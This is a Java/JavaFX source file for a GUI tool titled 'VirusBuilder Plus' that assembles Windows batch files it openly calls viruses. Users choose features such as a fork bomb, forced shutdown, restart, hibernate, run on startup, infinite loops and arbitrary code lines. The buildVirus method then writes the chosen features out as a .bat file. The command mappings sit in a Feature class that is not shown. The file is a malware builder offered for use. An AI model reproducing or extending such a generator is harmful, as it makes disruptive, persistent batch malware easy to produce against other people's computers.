package hackermancool;

import javafx.application.Application;
import javafx.application.Platform;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.control.cell.PropertyValueFactory;
import javafx.scene.layout.BorderPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.VBox;
import javafx.stage.Stage;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;

public class App extends Application {
    Stage window;

    Scene titleScene, builderScene;

    ComboBox<String> featuresComboBox;

    TextField primaryField, secondaryField;

    Label primaryFieldLabel, secondaryFieldLabel;

    ArrayList<Feature> features;

    TableView featuresTable;

    @Override
    public void start(Stage primaryStage) throws Exception {
        features = new ArrayList<>();
        window = primaryStage;
        window.setTitle("VirusBuilder Plus");

        // Menu bar
        MenuBar mainMenu = new MenuBar();

        // File menu
        Menu fileMenu = new Menu("_File");
        MenuItem newVirusMenuItem = new MenuItem("_New Virus...");
        newVirusMenuItem.setOnAction(e -> window.setScene(builderScene));
        SeparatorMenuItem fileSeparator1 = new SeparatorMenuItem();
        MenuItem exitMenuItem = new MenuItem("E_xit");
        exitMenuItem.setOnAction(e -> Platform.exit());
        fileMenu.getItems().addAll(newVirusMenuItem, fileSeparator1, exitMenuItem);

        mainMenu.getMenus().addAll(fileMenu);

        // Title scene
        Label titleLabel = new Label("VirusBuilder Plus");
        Label subtitleLabel = new Label("Created by hackermancool");
        titleLabel.setStyle("-fx-font: 64 arial;");
        subtitleLabel.setStyle("-fx-font: 24 arial;");

        VBox titleTextLayout = new VBox(5);
        titleTextLayout.getChildren().addAll(titleLabel, subtitleLabel);
        titleTextLayout.setPadding(new Insets(5, 5, 5, 5));
        titleTextLayout.setAlignment(Pos.CENTER);

        BorderPane titleLayout = new BorderPane();
        titleLayout.setCenter(titleTextLayout);
        titleLayout.setTop(mainMenu);

        titleScene = new Scene(titleLayout, 600, 200);

        // Builder scene
        Label builderLabel = new Label("VirusBuilder Plus");
        builderLabel.setStyle("-fx-font: 64 arial;");

        Label featureLabel = new Label("Feature:");
        featuresComboBox = new ComboBox<>();
        featuresComboBox.getItems().addAll(
                "Title",
                "Colour",
                "Text",
                "Open",
                "Create Section",
                "Jump to Section",
                "Infinite Loop",
                "Sleep",
                "Pause",
                "Fork Bomb",
                "Shutdown",
                "Restart",
                "Hibernate",
                "Run on Startup",
                "Clear Screen",
                "Run Line of Code"
        );
        featuresComboBox.setOnAction(e -> featureChanged());
        featuresComboBox.getSelectionModel().select(0);

        HBox features = new HBox(5);
        features.getChildren().addAll(featureLabel, featuresComboBox);

        primaryField = new TextField();
        secondaryField = new TextField();
        primaryFieldLabel = new Label();
        secondaryFieldLabel = new Label();
        HBox primary = new HBox(5);
        HBox secondary = new HBox(5);
        primary.getChildren().addAll(primaryFieldLabel, primaryField);
        secondary.getChildren().addAll(secondaryFieldLabel, secondaryField);

        VBox builderFieldLayout = new VBox(10);
        builderFieldLayout.getChildren().addAll(features, primary, secondary);

        featuresTable = new TableView<>();
        featuresTable.setMinWidth(350);

        TableColumn<Feature, String> actionColumn = new TableColumn<>("Feature");
        actionColumn.setCellValueFactory(new PropertyValueFactory<>("action"));
        actionColumn.setMinWidth(125);

        TableColumn<Feature, String> primaryFieldColumn = new TableColumn<>("Primary Field");
        primaryFieldColumn.setCellValueFactory(new PropertyValueFactory<>("primaryField"));
        primaryFieldColumn.setMinWidth(100);

        TableColumn<Feature, String> secondaryFieldColumn = new TableColumn<>("Secondary Field");
        secondaryFieldColumn.setCellValueFactory(new PropertyValueFactory<>("secondaryField"));
        secondaryFieldColumn.setMinWidth(100);

        featuresTable.getColumns().addAll(actionColumn, primaryFieldColumn, secondaryFieldColumn);

        Button addButton = new Button("Add Feature");
        addButton.setOnAction(e -> addFeature());
        TextField filenameField = new TextField();
        filenameField.setPromptText("virus.bat");
        Button buildButton = new Button("Build Virus");
        buildButton.setOnAction(e -> buildVirus(filenameField.getText()));

        HBox builderBuildLayout = new HBox(10);
        builderBuildLayout.setPadding(new Insets(10, 0, 0, 0));
        builderBuildLayout.getChildren().addAll(addButton, filenameField, buildButton);
        builderBuildLayout.setAlignment(Pos.CENTER);

        BorderPane builderLayout = new BorderPane();
        builderLayout.setPadding(new Insets(0, 20, 20, 20));
        builderLayout.setTop(builderLabel);
        builderLayout.setLeft(builderFieldLayout);
        builderLayout.setRight(featuresTable);
        builderLayout.setBottom(builderBuildLayout);

        builderScene = new Scene(builderLayout, 700, 300);
        featureChanged();

        window.setScene(titleScene);
        window.show();
    }

    private void buildVirus(String filename) {
        StringBuilder virus = new StringBuilder("@echo off\ncls\n");
        boolean loopExists = false;
        String loopLabel = "";

        for(Feature feature : features) {
            String[] args = {feature.getPrimaryField(), feature.getSecondaryField()};
            virus.append(Feature.actionToCommand(feature.getAction()));
            if(feature.getAction() == Action.SHUTDOWN
            || feature.getAction() == Action.RESTART)
                virus.append("/t ");
            virus.append(String.join(" ", args));
            if(feature.getAction() == Action.INFINITE_LOOP) {
                loopExists = true;
                loopLabel = feature.getPrimaryField();
            } else if(feature.getAction() == Action.SLEEP)
                virus.append(">nul");
            virus.append("\n");
        }

        if(loopExists) {
            virus.append("goto ");
            virus.append(loopLabel);
            virus.append("\n");
        }

        System.out.println("Virus Built, Contents:");
        System.out.println(virus.toString());

        File virusFile = new File(filename);
        try {
            virusFile.createNewFile();
            FileWriter virusWriter = new FileWriter(virusFile);
            virusWriter.write(virus.toString());
            virusWriter.close();
        } catch(IOException e) {
            System.out.println("Could not create file.");
            e.printStackTrace();
        }
    }

    private void featureChanged() {
        int feature = featuresComboBox.getSelectionModel().getSelectedIndex();

        if(!primaryField.isVisible() || !primaryFieldLabel.isVisible()) {
            primaryField.setVisible(true);
            primaryFieldLabel.setVisible(true);
        }

        primaryField.setText("");
        secondaryField.setText("");
        secondaryField.setVisible(false);
        secondaryFieldLabel.setVisible(false);

        switch(feature) {
            case 0:
                primaryFieldLabel.setText("Title:");
                primaryField.setPromptText("Virus Title");
                break;
            case 1:
                primaryFieldLabel.setText("Colour (CMD Format):");
                primaryField.setPromptText("0a");
                break;
            case 2:
                primaryFieldLabel.setText("Text:");
                primaryField.setPromptText("Hello, World!");
                break;
            case 3:
                primaryFieldLabel.setText("Target:");
                secondaryFieldLabel.setText("Arguments:");
                secondaryFieldLabel.setVisible(true);
                primaryField.setPromptText("notepad, https://www.google.com/");
                secondaryField.setPromptText("file.txt");
                secondaryField.setVisible(true);
                break;
            case 6:
                primaryField.setText("loop");
            case 4:
            case 5:
                primaryFieldLabel.setText("Section Label:");
                primaryField.setPromptText("a, start, section, etc.");
                break;
            case 7:
                primaryFieldLabel.setText("Sleep Duration (Seconds):");
                primaryField.setPromptText("5");
                break;
            case 8:
            case 12:
            case 13:
            case 14:
                primaryFieldLabel.setVisible(false);
                primaryField.setVisible(false);
                break;
            case 9:
                primaryFieldLabel.setText("Pauses/sleeps in virus");
                secondaryFieldLabel.setText("will disable fork bomb.");
                secondaryFieldLabel.setVisible(true);
                primaryField.setVisible(false);
                break;
            case 10:
            case 11:
                primaryFieldLabel.setText("Time Delay:");
                primaryField.setPromptText("60");
                break;
            case 15:
                primaryFieldLabel.setText("Code:");
                primaryField.setPromptText("set /a r=%RANDOM%");
                break;
        }
    }

    private void addFeature() {
        int index = featuresComboBox.getSelectionModel().getSelectedIndex();
        Action action = Feature.indexToEnum(index);

        Feature newFeature = new Feature(action, primaryField.getText(), secondaryField.getText());

        features.add(newFeature);
        featuresTable.getItems().add(newFeature);

        primaryField.setText("");
        secondaryField.setText("");

        System.out.println("Added feature: "
                + featuresComboBox.getSelectionModel().getSelectedItem());
    }

    public static void main(String[] args) {
        launch(args);
    }
}
